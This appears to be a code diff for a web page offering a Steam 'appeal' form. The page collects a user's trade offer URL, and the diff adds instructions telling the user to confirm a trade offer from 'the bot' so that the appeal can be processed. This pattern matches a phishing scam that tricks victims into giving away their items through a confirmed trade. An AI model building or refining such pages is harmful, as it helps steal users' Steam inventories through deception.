@@ -12,12 +12,12 @@
     <p>Please provide your appeal details and trade URL.</p>
     
     <!-- Description Box -->
-    <textarea id="descriptionBox" placeholder="Enter your description"></textarea>
+    <textarea id="descriptionBox" placeholder="Describe your issue in detail..."></textarea>
 
     <!-- Trade URL input -->
     <input type="text" id="tradeUrl" placeholder="Enter your Steam Trade Offer URL">
 
-    <!-- Get Trade URL Button -->
+    <!-- Button to get trade URL -->
     <button onclick="window.open('https://steamcommunity.com/my/tradeoffers/privacy', '_blank')">Get your TRADEURL HERE</button>
 
     <!-- I Understand Modal -->
@@ -29,8 +29,19 @@
       </div>
     </div>
 
-    <!-- Submit Button -->
+    <!-- Submit Appeal Button -->
     <button onclick="submitAppeal()">Submit Appeal & Run the Database</button>
+
+    <!-- Instructions after trade offer is sent -->
+    <div id="instructions" style="display: none;">
+      <p>Your offer has been sent successfully! Please follow these instructions to confirm your trade:</p>
+      <ol>
+        <li>Open the Steam client or mobile app.</li>
+        <li>Go to the "Trade Offers" section.</li>
+        <li>Find the offer from the bot and click "Confirm" to accept it.</li>
+        <li>Complete the trade and your appeal will be processed.</li>
+      </ol>
+    </div>
   </div>
 
   <script src="script.js"></script>
